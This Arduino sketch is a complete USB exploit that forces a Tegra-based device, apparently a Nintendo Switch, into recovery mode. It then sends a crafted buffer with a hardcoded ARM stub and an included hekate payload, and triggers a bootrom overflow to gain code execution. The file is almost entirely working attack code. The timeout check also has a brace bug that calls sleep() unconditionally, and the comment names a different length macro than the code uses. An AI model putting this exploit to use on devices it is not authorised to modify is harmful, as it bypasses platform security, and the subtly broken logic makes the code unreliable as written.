#include <Arduino.h>
#include <Usb.h>

#define RCM_STRAP_PIN 3         // Connects to Tegra HOME button
#define RCM_STRAP_TIME 1000     // Amount of time to hold RCM_STRAP LOW to enter RCM

#define USB_CHECK_INTERVAL 100  // How often to check for connection to the Tegra device
#define USB_CHECK_TIMEOUT 1500  // How long to try connecting to the Tegra device before giving up

// Contains fuseeBin and FUSEE_BIN_LENGTH
// Include only one payload here
// Use tools/binConverter.py to convert any payload bin you wish to load
#include "hekate_ctcaer_5.3.3.h"

#define INTERMEZZO_SIZE 92
const byte intermezzo[INTERMEZZO_SIZE] =
{
	0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
	0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
	0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
	0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
	0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
	0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
};

#define PACKET_CHUNK_SIZE 0x1000

#ifdef DEBUG
#define DEBUG_PRINT(x) Serial.print (x)
#define DEBUG_PRINTLN(x) Serial.println (x)
#define DEBUG_PRINTHEX(x,y) serialPrintHex (x,y)
#else
#define DEBUG_PRINT(x)
#define DEBUG_PRINTLN(x)
#define DEBUG_PRINTHEX(x,y)
#endif

USBHost usb;
EpInfo epInfo[3];

byte usbWriteBuffer[PACKET_CHUNK_SIZE] = {0};
uint32_t usbWriteBufferUsed = 0;
uint32_t packetsWritten = 0;

bool foundTegra = false;
byte tegraDeviceAddress = -1;

unsigned long lastCheckTime = 0;

void serialPrintHex(const byte *data, byte length)
{
	static const char *hexChars = "0123456789ABCDEF";

	for (int i = 0; i < length; i++)
	{
		DEBUG_PRINT(hexChars[(data[i] >> 4) & 0xF]);
		DEBUG_PRINT(hexChars[data[i] & 0xF]);
	}
	DEBUG_PRINTLN();
}

// From what I can tell, usb.outTransfer is completely broken for transfers larger than 64 bytes (even if maxPktSize is
// adjusted for that endpoint). This is a minimal and simplified reimplementation specific to our use cases that fixes
// that bug and is based on the code of USBHost::outTransfer, USBHost::SetPipeAddress and USBHost::OutTransfer.
void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* data)
{
	EpInfo* epInfo = usb.getEpInfoEntry(addr, ep);
	usb_pipe_table[epInfo->epAddr].HostDescBank[0].CTRL_PIPE.bit.PDADDR = addr;

	if (epInfo->bmSndToggle)
		USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
	else
		USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;

	UHD_Pipe_Write(epInfo->epAddr, PACKET_CHUNK_SIZE, data);
	uint32_t rcode = usb.dispatchPkt(tokOUT, epInfo->epAddr, 15);
	if (rcode)
	{
		if (rcode == USB_ERROR_DATATOGGLE)
		{
			epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
			if (epInfo->bmSndToggle)
				USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
			else
				USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;
		}
		else
		{
			DEBUG_PRINTLN("ERROR: USB OUT transfer failed");
			return;
		}
	}

	epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
}

void usbFlushBuffer()
{
	usbOutTransferChunk(tegraDeviceAddress, 0x01, PACKET_CHUNK_SIZE, usbWriteBuffer);

	memset(usbWriteBuffer, 0, PACKET_CHUNK_SIZE);
	usbWriteBufferUsed = 0;
	packetsWritten++;
}

// This accepts arbitrary sized USB writes and will automatically chunk them into writes of size 0x1000 and increment
// packetsWritten every time a chunk is written out.
void usbBufferedWrite(const byte *data, uint32_t length)
{
	while ((usbWriteBufferUsed + length) >= PACKET_CHUNK_SIZE)
	{
		uint32_t bytesToWrite = min(PACKET_CHUNK_SIZE - usbWriteBufferUsed, length);
		memcpy(usbWriteBuffer + usbWriteBufferUsed, data, bytesToWrite);
		usbWriteBufferUsed += bytesToWrite;
		usbFlushBuffer();
		data += bytesToWrite;
		length -= bytesToWrite;
	}

	if (length > 0)
	{
		memcpy(usbWriteBuffer + usbWriteBufferUsed, data, length);
		usbWriteBufferUsed += length;
	}
}

void usbBufferedWriteU32(uint32_t data)
{
	usbBufferedWrite((byte *)&data, 4);
}

void readTegraDeviceID(byte *deviceID)
{
	byte readLength = 16;
	UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);

	if (usb.inTransfer(tegraDeviceAddress, 0x01, &readLength, deviceID))
		DEBUG_PRINTLN("ERROR: Tegra device ID couldn't be read");
}

void sendPayload(const byte *payload, uint32_t payloadLength)
{
	byte zeros[0xFA4] = {0};

	usbBufferedWriteU32(0x30298);
	usbBufferedWrite(zeros, 680 - 4);

	for (uint32_t i = 0; i < 0x3C00; i++)
		usbBufferedWriteU32(0x4001F000);

	usbBufferedWrite(intermezzo, INTERMEZZO_SIZE);
	usbBufferedWrite(zeros, 0xFA4);
	usbBufferedWrite(payload, payloadLength);
	usbFlushBuffer();
}

void findTegraDevice(UsbDeviceDefinition *pdev)
{
	uint32_t address = pdev->address.devAddress;
	USB_DEVICE_DESCRIPTOR deviceDescriptor;
	if (usb.getDevDescr(address, 0, 0x12, (uint8_t *)&deviceDescriptor))
	{
		DEBUG_PRINTLN("ERROR: Tegra device descriptor couldn't be read");
	}
	else if ((deviceDescriptor.idVendor == 0x0955) && (deviceDescriptor.idProduct == 0x7321))
	{
		tegraDeviceAddress = address;
		foundTegra = true;
	}
}

void setupTegraDevice()
{
	epInfo[0].epAddr = 0;
	epInfo[0].maxPktSize = 0x40;
	epInfo[0].epAttribs = USB_TRANSFER_TYPE_CONTROL;
	epInfo[0].bmNakPower = USB_NAK_MAX_POWER;
	epInfo[0].bmSndToggle = 0;
	epInfo[0].bmRcvToggle = 0;

	epInfo[1].epAddr = 0x01;
	epInfo[1].maxPktSize = 0x40;
	epInfo[1].epAttribs = USB_TRANSFER_TYPE_BULK;
	epInfo[1].bmNakPower = USB_NAK_MAX_POWER;
	epInfo[1].bmSndToggle = 0;
	epInfo[1].bmRcvToggle = 0;

	usb.setEpInfoEntry(tegraDeviceAddress, 2, epInfo);
	usb.setConf(tegraDeviceAddress, 0, 0);
	usb.Task();

	UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);
}

void sleep()
{
	DEBUG_PRINTLN("SHUTTING DOWN");
	SCB->SCR |= SCB_SCR_SLEEPDEEP_Msk; // Enable deepsleep
	__DSB(); // Wait for memory write to complete
	__WFI(); // Enter sleep mode
}

void setup()
{
	// Trigger RCM
	digitalWrite(RCM_STRAP_PIN, LOW);
	pinMode(RCM_STRAP_PIN, OUTPUT);
	delay(RCM_STRAP_TIME);
	pinMode(RCM_STRAP_PIN, INPUT);

	// Initialize USB device
	if (usb.Init() == -1)
		sleep();
	#ifdef DEBUG
		Serial.begin(115200);
		delay(100);
	#endif

	// Locate Tegra device
	DEBUG_PRINTLN("Ready! Waiting for Tegra...");
	unsigned long currentTime = 0;
	while (!foundTegra)
	{
		currentTime = millis();
		usb.Task();

		if ((currentTime - lastCheckTime) > USB_CHECK_INTERVAL)
		{
			usb.ForEachUsbDevice(&findTegraDevice);
			lastCheckTime = currentTime;
		}
		if (currentTime > USB_CHECK_TIMEOUT)
			DEBUG_PRINTLN("ERROR: Tegra device not found");
			sleep();
	}

	// Configure Tegra device
	DEBUG_PRINTLN("Found Tegra!");
	setupTegraDevice();

	byte deviceID[16] = {0};
	readTegraDeviceID(deviceID);
	DEBUG_PRINTLN("Device ID: ");
	DEBUG_PRINTHEX(deviceID, 16);

	// Send payload
	DEBUG_PRINTLN("Sending payload...");
	UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_OUT, 0x40, 0, USB_HOST_NB_BK_1);
	packetsWritten = 0;
	sendPayload(fuseeBin, FUSEE_BIN_SIZE);

	if (packetsWritten % 2 != 1)
 	{
		DEBUG_PRINTLN("Switching to higher buffer...");
		usbFlushBuffer();
	}

	// Execute payload
	DEBUG_PRINTLN("Triggering vulnerability...");
	usb.ctrlReq(tegraDeviceAddress, 0, USB_SETUP_DEVICE_TO_HOST | USB_SETUP_TYPE_STANDARD | USB_SETUP_RECIPIENT_INTERFACE,
	            0x00, 0x00, 0x00, 0x00, 0x7000, 0x7000, usbWriteBuffer, NULL);

	// Finish and shut down
	DEBUG_PRINTLN("Done!");
	sleep();
}

// This should never execute
void loop()
{
	sleep();
}
